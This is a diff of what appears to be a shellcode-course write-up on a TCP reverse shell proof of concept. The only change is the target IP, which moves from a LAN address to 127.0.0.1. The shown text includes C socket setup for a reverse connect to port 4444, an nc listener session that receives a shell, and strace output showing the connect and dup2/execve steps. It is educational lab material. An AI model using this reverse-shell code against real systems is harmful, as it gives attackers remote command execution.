@@ -51,7 +51,7 @@ int main(void) {
     // IP address family
     serv_addr.sin_family = AF_INET;
     // Destination IP address
-    serv_addr.sin_addr.s_addr = inet_addr("192.168.0.143");
+    serv_addr.sin_addr.s_addr = inet_addr("127.0.0.1");
     // Destination port 
     serv_addr.sin_port = htons(4444);
     // Reverse connect to target IP address
@@ -82,7 +82,7 @@ A separate terminal demonstrating a successful reverse connection and shell on t
 
 ```bash
 osboxes@osboxes:~$ nc -lv 4444
-Connection from 192.168.0.143 port 4444 [tcp/*] accepted
+Connection from 127.0.0.1 port 4444 [tcp/*] accepted
 id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
 ```
@@ -96,7 +96,7 @@ Strace is used to debug and monitor the interactions between the executable proc
 osboxes@osboxes:~/Downloads/SLAE$ strace -e socket,connect,dup2,execve ./reverse_shell_tcp_poc 
 execve("./reverse_shell_tcp_poc", ["./reverse_shell_tcp_poc"], [/* 21 vars */]) = 0
 socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
-connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.0.143")}, 16) = 0
+connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("127.0.0.1")}, 16) = 0
 dup2(3, 0)                              = 0
 dup2(3, 1)                              = 1
 dup2(3, 2)                              = 2
